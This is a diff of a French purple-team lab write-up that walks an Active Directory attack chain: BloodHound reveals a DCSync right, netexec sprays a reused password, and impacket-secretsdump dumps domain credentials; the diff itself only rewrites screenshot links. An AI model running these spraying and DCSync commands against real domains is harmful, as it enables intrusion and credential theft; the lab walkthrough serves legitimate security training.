@@ -48,7 +48,8 @@ download C:\\Users\\alice.LAB\\Downloads\\20260612001023_BloodHound.zip /tmp/
 
 Une fois importé dans BloodHound, on cherche des relations sensibles :
 
-![[bloodhound_dcsync_path.png]]
+![](../../screenshots/bloodhound_dcsync_path.png)
+
 
 `svc-sync` a le droit `DCSync` sur le domaine `LAB.LOCAL`.
 
@@ -61,8 +62,7 @@ de `svc-backup` déjà obtenu au scénario 06 (`P@ssw0rd123`). Un admin ayant co
 netexec smb 192.168.10.100 -u ~/lab_purple_team/users.txt -p 'P@ssw0rd123' -d lab.local
 ```
 
-
-![[password_spraying.png]]
+![](../../screenshots/password_spraying.png)
 
 `svc-sync` est vulnérable : `P@ssw0rd123` est valide.
 
@@ -78,7 +78,7 @@ impacket-secretsdump lab.local/svc-sync:'P@ssw0rd123'@192.168.10.100
 | `lab.local/svc-sync:'P@ssw0rd123'` | Credentials avec droits de réplication                   |
 | `@192.168.10.100`                  | IP du DC ciblé                                           |
 
-![[dcsync_dump.png]]
+![](../../screenshots/dcsync_dump.png)
 
 ### Résultat
 
